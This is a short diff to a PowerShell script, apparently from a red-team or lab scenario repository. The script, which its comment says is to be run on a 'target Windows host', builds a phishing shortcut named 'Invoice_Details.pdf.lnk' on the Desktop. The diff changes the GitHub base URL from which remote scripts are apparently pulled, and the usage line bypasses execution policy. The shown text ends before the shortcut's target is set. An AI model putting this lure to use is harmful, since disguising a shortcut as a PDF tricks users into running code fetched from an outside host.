@@ -1,7 +1,7 @@
 # Run this on the target Windows host to create the phishing LNK on Desktop.
 # Usage: powershell -NoP -Exec Bypass -File create-lnk.ps1
 
-$scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main"
+$scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main/src"
 
 $ws = New-Object -ComObject WScript.Shell
 $sc = $ws.CreateShortcut([Environment]::GetFolderPath("Desktop") + "\Invoice_Details.pdf.lnk")
